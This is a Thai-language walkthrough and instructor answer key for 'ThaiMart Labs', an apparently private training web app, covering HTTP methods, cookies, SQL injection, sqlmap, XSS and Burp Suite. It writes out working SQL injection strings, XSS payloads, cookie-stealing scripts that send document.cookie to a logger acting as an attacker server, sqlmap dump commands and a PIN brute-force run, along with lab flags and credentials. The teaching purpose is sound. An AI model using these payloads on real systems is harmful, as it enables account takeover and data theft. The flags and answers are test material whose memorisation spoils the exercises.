# ThaiMart Labs - Walkthrough & Write-ups

เอกสารนี้เป็น walkthrough สำหรับทุก lab ใน ThaiMart Labs เหมาะสำหรับ:
- นักเรียนที่ต้องการคำแนะนำ
- ผู้สอนที่ต้องการ answer key
- การทบทวนหลังเรียน

**URL:** http://10.10.61.87

---

## สารบัญ

1. [Lab 01: HTTP Methods](#lab-01-http-methods)
2. [Lab 02: Cookie & Session](#lab-02-cookie--session)
3. [Lab 03: SQL Playground](#lab-03-sql-playground)
4. [Lab 04: SQL Injection - Auth Bypass](#lab-04-sql-injection---auth-bypass)
5. [Lab 05: Union-Based SQL Injection](#lab-05-union-based-sql-injection)
6. [Lab 06: SQLmap](#lab-06-sqlmap)
7. [Lab 07: Reflected XSS](#lab-07-reflected-xss)
8. [Lab 08: Cookie Stealing](#lab-08-cookie-stealing)
9. [Lab 09: Stored XSS](#lab-09-stored-xss)
10. [Lab 10: Burp Suite - Intercept](#lab-10-burp-suite---intercept)
11. [Lab 11: Burp Suite - Repeater](#lab-11-burp-suite---repeater)
12. [Lab 12: Burp Suite - Intruder](#lab-12-burp-suite---intruder)

---

## Lab 01: HTTP Methods

**URL:** http://10.10.61.87/lab01

**เป้าหมาย:** เข้าใจ HTTP Methods (GET, POST, PUT, DELETE) ผ่านระบบตะกร้าสินค้า

### แนวคิด

HTTP Methods คือวิธีที่ browser/client บอก server ว่าต้องการทำอะไร:
- **GET** - ขอดูข้อมูล (Read)
- **POST** - สร้างข้อมูลใหม่ (Create)
- **PUT** - แก้ไขข้อมูล (Update)
- **DELETE** - ลบข้อมูล (Delete)

### Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                         Browser (lab01.ejs)                         │
│  ┌─────────────────────┐         ┌─────────────────────────────┐   │
│  │   Shopping Area     │         │    Network Inspector        │   │
│  │  - Product Grid     │         │  - Request Display          │   │
│  │  - Shopping Cart    │  ────►  │  - curl Command (Copy)      │   │
│  │  - Live Sync        │         │  - JSON Response            │   │
│  └─────────────────────┘         └─────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼ HTTP Request
┌─────────────────────────────────────────────────────────────────────┐
│                      Backend (lab01.js)                             │
│  ┌──────────────────┐    ┌──────────────────────────────────────┐  │
│  │ In-Memory Data   │    │           API Endpoints              │  │
│  │  - products[]    │    │  GET    /lab01/products              │  │
│  │  - cart[]        │    │  GET    /lab01/cart                  │  │
│  │                  │    │  POST   /lab01/cart                  │  │
│  │                  │    │  PUT    /lab01/cart/:id              │  │
│  │                  │    │  DELETE /lab01/cart/:id              │  │
│  └──────────────────┘    └──────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

### UI Layout

| ซ้าย (60%) | ขวา (40%) |
|------------|-----------|
| Product Grid (6 สินค้า) | Network Inspector |
| Shopping Cart | - Request Display |
| Live Sync Indicator | - curl Command (Copy) |
| | - JSON Response |

### Products ในระบบ

| ID | Name | Price | Image |
|----|------|-------|-------|
| 1 | iPhone 15 Pro | ฿48,900 | 📱 |
| 2 | AirPods Pro 2 | ฿8,990 | 🎧 |
| 3 | MacBook Air M3 | ฿42,900 | 💻 |
| 4 | iPad Pro 11" | ฿35,900 | 📲 |
| 5 | Apple Watch Series 9 | ฿15,900 | ⌚ |
| 6 | Magic Keyboard | ฿3,990 | ⌨️ |

### API Endpoints

| Method | Path | Action | Status Codes |
|--------|------|--------|--------------|
| GET | `/lab01/products` | ดูสินค้าทั้งหมด | 200 |
| GET | `/lab01/cart` | ดูตะกร้า | 200 |
| POST | `/lab01/cart` | เพิ่มสินค้า | 201, 400, 404 |
| PUT | `/lab01/cart/:id` | แก้ไขจำนวน | 200, 400, 404 |
| DELETE | `/lab01/cart/:id` | ลบสินค้า | 200, 404 |
| POST | `/lab01/cart/clear` | ล้างตะกร้า | 200 |

### Walkthrough

#### 1. ดูสินค้าทั้งหมด (GET)
```bash
curl http://10.10.61.87/lab01/products
```

**Response:**
```json
{
  "success": true,
  "method": "GET",
  "path": "/lab01/products",
  "data": [
    {"id": 1, "name": "iPhone 15 Pro", "price": 48900, "image": "📱", "category": "อิเล็กทรอนิกส์"},
    {"id": 2, "name": "AirPods Pro 2", "price": 8990, "image": "🎧", "category": "อุปกรณ์เสริม"}
  ],
  "count": 6
}
```

#### 2. เพิ่มสินค้าลงตะกร้า (POST)
```bash
curl -X POST http://10.10.61.87/lab01/cart \
     -H "Content-Type: application/json" \
     -d '{"product_id": 1, "quantity": 2}'
```

**Response:**
```json
{
  "success": true,
  "method": "POST",
  "path": "/lab01/cart",
  "message": "เพิ่มสินค้าลงตะกร้าแล้ว",
  "data": {"id": 1, "product_id": 1, "name": "iPhone 15 Pro", "price": 48900, "quantity": 2},
  "cart": [...]
}
```

**Error Cases:**
- ไม่ระบุ product_id → Status 400
- product_id ไม่มีในระบบ → Status 404

#### 3. ดูตะกร้า (GET)
```bash
curl http://10.10.61.87/lab01/cart
```

**Response:**
```json
{
  "success": true,
  "method": "GET",
  "path": "/lab01/cart",
  "data": [...],
  "count": 2,
  "total": 106790
}
```

#### 4. แก้ไขจำนวน (PUT)
```bash
curl -X PUT http://10.10.61.87/lab01/cart/1 \
     -H "Content-Type: application/json" \
     -d '{"quantity": 5}'
```

**Response:**
```json
{
  "success": true,
  "method": "PUT",
  "path": "/lab01/cart/1",
  "message": "แก้ไขจำนวนสินค้าแล้ว",
  "data": {"id": 1, "quantity": 5},
  "cart": [...]
}
```

#### 5. ลบสินค้าออกจากตะกร้า (DELETE)
```bash
curl -X DELETE http://10.10.61.87/lab01/cart/1
```

**Response:**
```json
{
  "success": true,
  "method": "DELETE",
  "path": "/lab01/cart/1",
  "message": "ลบสินค้าออกจากตะกร้าแล้ว",
  "data": {"id": 1, "name": "iPhone 15 Pro"},
  "cart": [...]
}
```

#### 6. ล้างตะกร้าทั้งหมด (POST)
```bash
curl -X POST http://10.10.61.87/lab01/cart/clear
```

### Live Sync Feature

ตะกร้าจะ auto-refresh ทุก **2 วินาที** ผ่าน polling:
- เมื่อนักเรียนรัน `curl` ใน terminal → browser จะ update อัตโนมัติ
- มี "Live Sync" indicator สีเขียวแสดงสถานะ
- Polling หยุดเมื่อเปลี่ยน tab (ประหยัด resources)

**ทำไมสำคัญ:** นักเรียนเห็นผลลัพธ์ของ curl command บน browser ทันทีโดยไม่ต้อง refresh

### Network Inspector Panel

เมื่อคลิกปุ่มบนหน้าเว็บ จะแสดง:
1. **Request Display** - Method และ Path ที่ส่งไป
2. **curl Command** - คำสั่ง curl ที่เทียบเท่า (กด Copy ได้)
3. **JSON Response** - ข้อมูลที่ server ตอบกลับ

### Teaching Flow

1. **นักเรียนคลิก "เพิ่มลงตะกร้า"** → เห็น POST request ใน Network Inspector
2. **นักเรียนเห็น curl command** → Copy ไปใช้ใน terminal
3. **นักเรียนรัน curl ใน terminal** → เพิ่มสินค้าอื่น
4. **Browser auto-update** → เห็นสินค้าใหม่ในตะกร้า (Live Sync)

**Key Learning:** "สิ่งที่ฉันกดบนเว็บ = curl command นี้" / "curl ใน terminal → เห็นผลบนเว็บทันที"

### สิ่งที่เรียนรู้
- HTTP Methods แต่ละตัวมีความหมายเฉพาะ (CRUD)
- curl command สามารถทำทุกอย่างที่ browser ทำได้
- Network Inspector แสดงให้เห็นว่า browser ส่ง request อะไร
- JSON format สำหรับ request/response body
- HTTP Status Codes: 200 (OK), 201 (Created), 400 (Bad Request), 404 (Not Found)

---

## Lab 02: Cookie & Session

**URL:** http://10.10.61.87/lab02

**เป้าหมาย:** เข้าใจว่า Cookie และ Session ทำงานอย่างไร

### Credentials
- **Username:** user1
- **Password:** password123

### แนวคิด

HTTP เป็น stateless protocol - server ไม่จำว่าเราเป็นใคร Cookie ช่วยให้ server จำเราได้

### Walkthrough

#### 1. Login เข้าระบบ
1. ไปที่ http://10.10.61.87/lab02
2. ใส่ username: `user1`, password: `password123`
3. กด Login

#### 2. ตรวจสอบ Cookies (DevTools)
1. กด F12 เปิด DevTools
2. ไปที่ Tab **Application** → **Cookies**
3. จะเห็น cookies:
   - `thaimart_session` - Session ID
   - `thaimart_user` - Username
   - `thaimart_theme` - Theme preference

#### 3. Exercise: ลบ Session Cookie
1. ใน DevTools → Cookies
2. Right-click ที่ `thaimart_session` → Delete
3. Refresh หน้าเว็บ
4. **ผลลัพธ์:** ต้อง login ใหม่!

**ทำไม?** เพราะ server ใช้ session cookie ในการจำว่าเราเป็นใคร พอลบไป server ก็ไม่รู้จักเราแล้ว

#### 4. Exercise: แก้ไข Theme Cookie
1. ใน DevTools → Cookies
2. Double-click ที่ค่าของ `thaimart_theme`
3. เปลี่ยนเป็น `dark` หรือ `orange`
4. Refresh หน้าเว็บ
5. **ผลลัพธ์:** Theme เปลี่ยน!

### สิ่งที่เรียนรู้
- Cookie เก็บข้อมูลบน browser
- Session ช่วยให้ server จำ user ได้
- Cookie สามารถถูกแก้ไขได้ → ต้องระวังเรื่อง security

---

## Lab 03: SQL Playground

**URL:** http://10.10.61.87/lab03

**เป้าหมาย:** เรียนรู้ SQL commands พื้นฐาน

### แนวคิด

SQL (Structured Query Language) ใช้สำหรับจัดการข้อมูลใน database

### Walkthrough

#### 1. SELECT - ดูข้อมูล
```sql
SELECT * FROM playground_products;
```

```sql
SELECT name, price FROM playground_products WHERE price > 500;
```

```sql
SELECT * FROM playground_products ORDER BY price DESC;
```

#### 2. INSERT - เพิ่มข้อมูล
```sql
INSERT INTO playground_products (name, price, stock, category)
VALUES ('หูฟัง Bluetooth', 1990, 50, 'อิเล็กทรอนิกส์');
```

#### 3. UPDATE - แก้ไขข้อมูล
```sql
UPDATE playground_products SET price = 999 WHERE id = 1;
```

```sql
UPDATE playground_products SET stock = stock - 1 WHERE name = 'หูฟัง Bluetooth';
```

#### 4. DELETE - ลบข้อมูล
```sql
DELETE FROM playground_products WHERE id = 1;
```

#### 5. Reset Table
กดปุ่ม "Reset Table" เพื่อกลับไปข้อมูลเริ่มต้น

### คำสั่งที่ถูก Block
Lab นี้ block คำสั่งอันตราย:
- `DROP` - ลบ table/database
- `TRUNCATE` - ล้างข้อมูลทั้งหมด
- `ALTER` - เปลี่ยนโครงสร้าง table
- `CREATE` - สร้าง table ใหม่

### สิ่งที่เรียนรู้
- SQL CRUD operations (Create, Read, Update, Delete)
- WHERE clause สำหรับ filter
- ORDER BY สำหรับเรียงลำดับ

---

## Lab 04: SQL Injection - Auth Bypass

**URL:** http://10.10.61.87/lab04

**เป้าหมาย:** เข้าใจและทดลอง SQL Injection แบบ Authentication Bypass

**Flag:** `SMC{4uth_byp4ss_success}`

### Credentials (ปกติ)
- **Username:** seller1
- **Password:** securepass99

### แนวคิด

SQL Injection เกิดขึ้นเมื่อ application นำ user input ไปรวมกับ SQL query โดยไม่มีการ sanitize

**Query ที่มีช่องโหว่:**
```sql
SELECT * FROM seller_accounts
WHERE username = '[USER_INPUT]' AND password = '[USER_INPUT]'
```

### Walkthrough

#### วิธีที่ 1: OR '1'='1
1. ไปที่ http://10.10.61.87/lab04
2. ใส่ในช่อง Username:
   ```
   ' OR '1'='1
   ```
3. ใส่ในช่อง Password:
   ```
   ' OR '1'='1
   ```
4. กด Login

**Query ที่เกิดขึ้น:**
```sql
SELECT * FROM seller_accounts
WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'
```

เนื่องจาก `'1'='1'` เป็นจริงเสมอ → Login สำเร็จ!

**หลัง Bypass สำเร็จ:** จะเห็น flag banner `SMC{4uth_byp4ss_success}` และข้อมูลว่า input อะไรถูกใช้

#### วิธีที่ 2: Comment out password check
1. ใส่ในช่อง Username:
   ```
   admin'--
   ```
2. ใส่ในช่อง Password: (อะไรก็ได้)
   ```
   anything
   ```

**Query ที่เกิดขึ้น:**
```sql
SELECT * FROM seller_accounts
WHERE username = 'admin'--' AND password = 'anything'
```

`--` คือ comment ใน SQL → ส่วน password check ถูกข้ามไป!

#### วิธีที่ 3: ใช้ username จริง
```
seller1'--
```

### สิ่งที่เรียนรู้
- SQL Injection สามารถ bypass authentication ได้
- การใช้ `'` เพื่อหลุดออกจาก string
- การใช้ `--` เพื่อ comment ส่วนที่เหลือ
- การใช้ `OR '1'='1'` เพื่อทำให้ condition เป็นจริงเสมอ

### การป้องกัน
- ใช้ Prepared Statements / Parameterized Queries
- ใช้ ORM (Object-Relational Mapping)
- Input validation และ sanitization

---

## Lab 05: Union-Based SQL Injection

**URL:** http://10.10.61.87/lab05

**เป้าหมาย:** ใช้ UNION-based SQL Injection เพื่อดึงข้อมูลจาก tables อื่น

### แนวคิด

UNION ใน SQL ใช้รวมผลลัพธ์จากหลาย queries แต่ต้องมีจำนวน columns เท่ากัน

### Walkthrough

#### Step 1: หาจำนวน columns
ใช้ `ORDER BY` เพิ่มไปเรื่อยๆ จนกว่าจะ error

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--    ← ยังทำงาน
' ORDER BY 5--    ← Error! แสดงว่ามี 4 columns
```

#### Step 2: หา columns ที่แสดงผล
```
' UNION SELECT 1,2,3,4--
```

ดูว่าเลข 1,2,3,4 แสดงที่ตำแหน่งไหนบนหน้าเว็บ

#### Step 3: ดึง Database version
```
' UNION SELECT 1,version(),3,4--
```

**ผลลัพธ์:** `PostgreSQL 16.x`

#### Step 4: ดึงรายชื่อ tables
```
' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=current_schema()--
```

**ผลลัพธ์:** จะเห็น tables ต่างๆ รวมถึง `admin_credentials`

#### Step 5: ดึง columns ของ admin_credentials
```
' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='admin_credentials'--
```

**ผลลัพธ์:** `id`, `username`, `password_hash`, `role`

#### Step 6: ดึงข้อมูล admin
```
' UNION SELECT 1,username,password_hash,role FROM admin_credentials--
```

**ผลลัพธ์:**
| username | password_hash | role |
|----------|---------------|------|
| superadmin | $2b$10$... | admin |

### สิ่งที่เรียนรู้
- UNION-based SQLi ใช้ดึงข้อมูลจาก tables อื่น
- `information_schema` เก็บ metadata ของ database
- ขั้นตอนการ enumerate: columns → tables → data

---

## Lab 06: SQLmap

**URL:** http://10.10.61.87/lab06?id=1

**เป้าหมาย:** ใช้ sqlmap tool อัตโนมัติในการทำ SQL Injection

### เครื่องมือที่ต้องใช้
- Kali Linux หรือเครื่องที่มี sqlmap

### Walkthrough

#### Step 1: ตรวจจับ SQL Injection
```bash
sqlmap -u "http://10.10.61.87/lab06?id=1" --batch
```

**ผลลัพธ์:** sqlmap จะพบว่า parameter `id` มีช่องโหว่

#### Step 2: ดูรายชื่อ databases
```bash
sqlmap -u "http://10.10.61.87/lab06?id=1" --dbs --batch
```

**ผลลัพธ์:**
```
available databases:
[*] information_schema
[*] thaimart
```

#### Step 3: ดูรายชื่อ tables
```bash
sqlmap -u "http://10.10.61.87/lab06?id=1" -D thaimart --tables --batch
```

**ผลลัพธ์:** จะเห็น tables ต่างๆ รวมถึง `secret_orders`

#### Step 4: Dump ข้อมูลลับ
```bash
sqlmap -u "http://10.10.61.87/lab06?id=1" -D thaimart -T secret_orders --dump --batch
```

**ผลลัพธ์:** ข้อมูล orders ลับพร้อมเลขบัตรเครดิต (fake)

### Options ที่มีประโยชน์
```bash
# ระบุ technique
sqlmap -u "URL" --technique=U  # Union-based only

# เพิ่ม verbosity
sqlmap -u "URL" -v 3

# ใช้ threads เพิ่มความเร็ว
sqlmap -u "URL" --threads=10

# Dump ทุกอย่าง
sqlmap -u "URL" --dump-all
```

### สิ่งที่เรียนรู้
- sqlmap ทำให้ SQLi เป็นเรื่องง่าย
- การใช้ automated tools ในการ pentest
- ความสำคัญของการป้องกัน SQLi

---

## Lab 07: Reflected XSS

**URL:** http://10.10.61.87/lab07

**เป้าหมาย:** เข้าใจ Reflected XSS

### แนวคิด

XSS (Cross-Site Scripting) เกิดเมื่อ application แสดง user input โดยไม่ escape ทำให้ attacker สามารถ inject JavaScript ได้

**Reflected XSS:** Script ถูกส่งผ่าน URL/parameter และ reflect กลับมาในหน้าเว็บ

### Walkthrough

#### 1. ทดสอบปกติ
1. ไปที่ http://10.10.61.87/lab07
2. ค้นหา "iPhone"
3. สังเกตว่าคำค้นหาแสดงบนหน้าเว็บ

#### 2. ทดสอบ XSS พื้นฐาน
ค้นหา:
```html
<script>alert('XSS')</script>
```

**ผลลัพธ์:** Popup alert แสดงขึ้นมา!

#### 3. Variations
```html
<script>alert(document.domain)</script>
```

```html
<img src=x onerror="alert('XSS')">
```

```html
<svg onload="alert('XSS')">
```

#### 4. สร้าง Malicious Link
URL ที่มี XSS:
```
http://10.10.61.87/lab07?q=<script>alert('XSS')</script>
```

Attacker ส่ง link นี้ให้เหยื่อ → เหยื่อคลิก → Script ทำงานบน browser เหยื่อ

### สิ่งที่เรียนรู้
- XSS ทำงานบน client-side (browser ของเหยื่อ)
- Reflected XSS ต้องหลอกให้เหยื่อคลิก link
- Script สามารถเข้าถึง cookies, DOM, และอื่นๆ

---

## Lab 08: Cookie Stealing

**URL:** http://10.10.61.87/lab08

**เป้าหมาย:** ใช้ XSS ขโมย cookie ของเหยื่อ

### Credentials
- **Username:** member1
- **Password:** 1234

### เครื่องมือ
- Cookie Logger: http://10.10.61.87/logger

### Walkthrough

#### Step 1: Login เป็น member1
1. ไปที่ http://10.10.61.87/lab08
2. Login ด้วย member1 / 1234

#### Step 2: ดู Cookie Logger
1. เปิด http://10.10.61.87/logger ใน tab ใหม่
2. นี่คือ "attacker server" ที่จะรับ cookies

#### Step 3: สร้าง XSS Payload
```html
<img src=x onerror="fetch('http://10.10.61.87/logger/catch?c='+document.cookie)">
```

หรือ:
```html
<script>
new Image().src='http://10.10.61.87/logger/catch?c='+document.cookie;
</script>
```

#### Step 4: ส่ง Payload
1. ใส่ payload ในช่องค้นหา
2. หรือสร้าง URL:
```
http://10.10.61.87/lab08/search?q=<img src=x onerror="fetch('http://10.10.61.87/logger/catch?c='+document.cookie)">
```

#### Step 5: ตรวจสอบ Logger
1. กลับไปดู http://10.10.61.87/logger
2. จะเห็น cookies ที่ถูกส่งมา!

### Real Attack Scenario
1. Attacker สร้าง link ที่มี XSS payload
2. ส่งให้เหยื่อ (email, chat, social media)
3. เหยื่อคลิก link
4. Cookie ถูกส่งไป attacker server
5. Attacker ใช้ cookie นั้น login เป็นเหยื่อ (Session Hijacking)

### สิ่งที่เรียนรู้
- XSS สามารถขโมย cookies ได้
- Session Hijacking คือการขโมย session cookie
- ทำไม HttpOnly cookie ถึงสำคัญ

---

## Lab 09: Stored XSS

**URL:** http://10.10.61.87/lab09

**เป้าหมาย:** เข้าใจ Stored XSS

### แนวคิด

**Stored XSS:** Script ถูกเก็บใน database และทำงานทุกครั้งที่มีคนเปิดหน้านั้น

อันตรายกว่า Reflected XSS เพราะไม่ต้องหลอกให้คลิก link

### Walkthrough

#### Step 1: ดู Reviews ปกติ
1. ไปที่ http://10.10.61.87/lab09
2. ดู reviews ที่มีอยู่

#### Step 2: เพิ่ม Review ที่มี XSS
1. กรอกชื่อ: `Hacker`
2. กรอก Review:
```html
สินค้าดีมาก! <script>alert('Stored XSS')</script>
```
3. กด Submit

#### Step 3: ทดสอบ
1. Refresh หน้า
2. Alert จะแสดงทุกครั้ง!
3. ทุกคนที่เปิดหน้านี้จะเจอ XSS

#### Payloads อื่นๆ
```html
ดีมากครับ <img src=x onerror="alert('XSS')">
```

```html
แนะนำเลย <svg onload="alert(document.cookie)">
```

Cookie stealer:
```html
<script>fetch('http://10.10.61.87/logger/catch?c='+document.cookie)</script>
```

### ความอันตราย
- ทุกคนที่เปิดหน้าจะโดน
- ไม่ต้องหลอกให้คลิก link
- สามารถขโมย cookies ของทุกคนที่เข้ามาดู

### การ Reset
ถ้า XSS เยอะเกินไป:
```bash
ssh thaimart-lab "cd ~/ThaiMart-Labs && sudo docker-compose down -v && sudo docker-compose up -d"
```

### สิ่งที่เรียนรู้
- Stored XSS อันตรายกว่า Reflected XSS
- ทุก user input ที่แสดงบนเว็บต้อง escape
- Content Security Policy (CSP) ช่วยป้องกันได้

---

## Lab 10: Burp Suite - Intercept

**URL:** http://10.10.61.87/lab10

**เป้าหมาย:** ใช้ Burp Suite ดักจับและแก้ไข HTTP request

**Flag:** `SMC{1nt3rc3pt_m4st3r}`

### เครื่องมือที่ต้องใช้
- Burp Suite (Community Edition ฟรี)
- Browser ที่ตั้งค่า proxy เป็น 127.0.0.1:8080

### Walkthrough

#### Step 1: ตั้งค่า Burp Suite
1. เปิด Burp Suite
2. ไปที่ Proxy → Options → ตรวจสอบว่า listener รันที่ 127.0.0.1:8080
3. ไปที่ Proxy → Intercept → เปิด "Intercept is on"

#### Step 2: ตั้งค่า Browser Proxy
- Firefox: Settings → Network → Manual proxy → 127.0.0.1:8080
- หรือใช้ FoxyProxy extension

#### Step 3: ไปที่ Lab 10
1. เปิด http://10.10.61.87/lab10
2. เลือกสินค้า กรอกจำนวน
3. กด "สั่งซื้อ"

#### Step 4: ดักจับ Request
Burp จะดักจับ request ได้ ดูที่ body:
```
product_id=1&quantity=1&discount_code=
```

#### Step 5: (Hint) หา Discount Code
ก่อนแก้ไข ลอง:
```bash
curl http://10.10.61.87/lab10/api/promotions
```

**ผลลัพธ์:** จะเห็น code `THAIM4RT_VIP_2026`

#### Step 6: แก้ไข Request
ใน Burp แก้ไข request body:
```
product_id=1&quantity=1&discount_code=THAIM4RT_VIP_2026
```

กด "Forward" เพื่อส่ง request

#### Step 7: รับ Flag
หน้าเว็บจะแสดง:
```
ยินดีด้วย! Flag: SMC{1nt3rc3pt_m4st3r}
```

### สิ่งที่เรียนรู้
- Burp Suite ดักจับ HTTP requests ได้
- Hidden form fields สามารถแก้ไขได้
- Client-side validation ไม่เพียงพอ

---

## Lab 11: Burp Suite - Repeater

**URL:** http://10.10.61.87/lab11

**เป้าหมาย:** ใช้ Burp Repeater ส่ง request ซ้ำและแก้ไข headers

**Flag:** `SMC{r3p34t3r_h34d3r_f0und}`

### Walkthrough

#### Step 1: ส่ง Request แรก
1. เปิด Burp Suite (Proxy → Intercept off ก็ได้)
2. ไปที่ http://10.10.61.87/lab11
3. กดปุ่ม "Check Status"

#### Step 2: ดู Request ใน HTTP History
1. ไปที่ Proxy → HTTP history
2. หา request `GET /lab11/api/status`
3. ดู response:
```json
{
  "status": "online",
  "access_token": "th4im4rt_s3cr3t_t0k3n_2026"
}
```

#### Step 3: ส่งไป Repeater
1. Right-click ที่ request → "Send to Repeater"
2. ไปที่ tab Repeater

#### Step 4: เปลี่ยน Path
แก้ไข request:
```
GET /lab11/api/secret HTTP/1.1
```

กด "Send" → จะได้ error "Missing X-Access-Token header"

#### Step 5: เพิ่ม Header
เพิ่ม header:
```
X-Access-Token: th4im4rt_s3cr3t_t0k3n_2026
```

Request สมบูรณ์:
```
GET /lab11/api/secret HTTP/1.1
Host: 10.10.61.87
X-Access-Token: th4im4rt_s3cr3t_t0k3n_2026
```

กด "Send"

#### Step 6: รับ Flag
```json
{
  "flag": "SMC{r3p34t3r_h34d3r_f0und}"
}
```

### สิ่งที่เรียนรู้
- Repeater ใช้ส่ง request ซ้ำและแก้ไขได้
- APIs มักต้องการ authentication headers
- Token ที่ได้จาก endpoint หนึ่งอาจใช้กับอีก endpoint ได้

---

## Lab 12: Burp Suite - Intruder

**URL:** http://10.10.61.87/lab12

**เป้าหมาย:** ใช้ Burp Intruder ทำ brute force attack

**Flag:** `SMC{brut3_f0rc3_w1ns}`
**Correct PIN:** `7392`

### Walkthrough

#### Step 1: ลองส่ง PIN ผิด
1. ไปที่ http://10.10.61.87/lab12
2. ใส่ PIN อะไรก็ได้ เช่น `0000`
3. กด "Redeem"

#### Step 2: ดักจับ Request
ใน Burp Proxy จะเห็น:
```
POST /lab12/verify HTTP/1.1
...
Content-Type: application/json

{"pin":"0000"}
```

#### Step 3: ส่งไป Intruder
1. Right-click → "Send to Intruder"
2. ไปที่ tab Intruder

#### Step 4: ตั้งค่า Position
1. ไปที่ Positions tab
2. กด "Clear §"
3. Select ตัวเลข PIN แล้วกด "Add §"
```json
{"pin":"§0000§"}
```

#### Step 5: ตั้งค่า Payload
1. ไปที่ Payloads tab
2. Payload type: Numbers
3. From: 0
4. To: 9999
5. Step: 1
6. Min/Max integer digits: 4 (ให้เป็น 0000-9999)

#### Step 6: Start Attack
1. กด "Start attack"
2. รอให้ทำงาน (อาจใช้เวลาสักพัก)

#### Step 7: หา Correct PIN
1. ดูที่ column "Status" หรือ "Length"
2. PIN ที่ถูกต้องจะได้ Status 200 (ไม่ใช่ 401)
3. **Correct PIN:** `7392`

#### Step 8: ใส่ PIN ที่ถูกต้อง
กลับไปที่หน้าเว็บ ใส่ `7392` → ได้ Flag!

### Tips
- ใน Burp Community Edition Intruder จะช้า (rate limited)
- สามารถใช้ ffuf, hydra, หรือ script แทนได้
- ดู response length ที่แตกต่างเพื่อหาคำตอบ

### ทางเลือก: ใช้ ffuf
```bash
ffuf -u http://10.10.61.87/lab12/verify \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"pin":"FUZZ"}' \
     -w <(seq -w 0000 9999) \
     -mc 200
```

### สิ่งที่เรียนรู้
- Intruder ใช้ทำ brute force/fuzzing
- ระบบที่ไม่มี rate limiting เสี่ยงต่อ brute force
- การดู response ที่แตกต่างเพื่อหาคำตอบ

---

## สรุป Security Concepts

| Lab | Vulnerability | Prevention |
|-----|---------------|------------|
| 04, 05, 06 | SQL Injection | Prepared Statements, ORM |
| 07, 08, 09 | XSS | Output encoding, CSP |
| 10 | Hidden Field Tampering | Server-side validation |
| 11 | Missing Auth | Proper authentication |
| 12 | No Rate Limiting | Rate limiting, CAPTCHA |

---

## เครื่องมือที่ใช้

| Tool | Purpose | Labs |
|------|---------|------|
| curl | HTTP requests | 01, 06 |
| Browser DevTools | Inspect cookies, network | 02, 07-09 |
| sqlmap | Automated SQLi | 06 |
| Burp Suite | Intercept, modify requests | 10, 11, 12 |

---

*สร้างเมื่อ: 2026-04-19*
*อัปเดตล่าสุด: 2026-04-20 - เพิ่มรายละเอียด Lab 01 (Architecture, API endpoints, Live Sync)*
